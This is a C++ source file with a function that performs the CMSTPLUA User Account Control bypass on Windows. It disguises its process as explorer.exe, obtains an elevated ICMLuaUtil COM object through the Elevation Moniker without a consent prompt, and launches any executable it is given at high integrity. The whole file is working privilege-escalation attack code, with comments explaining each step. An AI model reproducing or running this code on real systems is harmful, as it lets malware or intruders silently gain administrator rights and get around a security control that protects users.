#include <iostream>
#include <format>
#include "helpers.h"
#include "cmstplua.h"
#include <initguid.h>
// {6EDD6D74-C007-4E75-B76A-E5740995E24C}
DEFINE_GUID(IID_ICMLuaUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);
constexpr LPCOLESTR ELEVATION_MONIKER_ADMIN = OLESTR("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");

bool CMSTPLUA(PCCH ExecutableFilePathA)
{
	HRESULT hr = E_FAIL;

	// Rename the process to explorer.exe to bypass the UAC dialog box.
	constexpr auto EXECPATH = "c:\\Windows\\explorer.exe";

	if (!ProcessRename(EXECPATH)) {
		std::cout << std::format("[-] ProcessRename({})\n", EXECPATH);
		return false;
	}
	// Methods of objects created by this thread always run on the same thread.
	ComInitializer comInit(COINIT_APARTMENTTHREADED);
	if (FAILED(comInit.result())) {
		std::cout << std::format("[-] CoInitializeEx(): HRESULT=0x{:X}\n",
			comInit.result());
		return false;
	}
	// Use BIND_OPTS3 structure to specify an out-of-proc COM server.
	// The corresponding COM object must be enabled for elevation using following registry key
	// HKLM\Software\Classes\CLSID\{Guid}\Elevation : Enabled (REG_DWORD) = 1
	BIND_OPTS3 BindOpts3{ };
	BindOpts3.cbStruct = sizeof(BindOpts3);
	BindOpts3.dwClassContext = CLSCTX_LOCAL_SERVER; // separate process
	// Use the COM Elevation Moniker to elevate privileges.
	// Activation request is sent to an following out-of-proc activation server as per BIND_OPTS3.
	// C:\Windows\system32\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
	ICMLuaUtil* CMLuaUtil = nullptr;
	hr = CoGetObject(
		ELEVATION_MONIKER_ADMIN,
		&BindOpts3,
		IID_ICMLuaUtil,
		reinterpret_cast<void**>(&CMLuaUtil));
	
	if (FAILED(hr)) {
		std::cout << std::format("[-] CoGetObject(): HRESULT=0x{:X}\n", hr);
		return false;
	}
	// ICMLuaUtil->ShellExec() requires the process name in WCHAR.
	PWCHAR ExecFilePathW = StringAtoW(ExecutableFilePathA, 0);
	if (!ExecFilePathW) {
		std::cout << std::format("[-] StringAtoW({})\n", EXECPATH);
		return false;
	}
	AutoHeapFree AHFExecFilePathW(ExecFilePathW);

	// ExecutableFilePathW will be spawned by DllHost.exe and will run at High IL.
	hr = CMLuaUtil->lpVtbl->ShellExec(
		CMLuaUtil,
		static_cast<LPCTSTR>(ExecFilePathW),
		nullptr,
		nullptr,
		SEE_MASK_DEFAULT,
		SW_SHOW);
	if (FAILED(hr)) {
		std::cout << std::format("[-] ShellExec(): HRESULT=0x{:X}\n", hr);
		return false;
	}

	return true;
}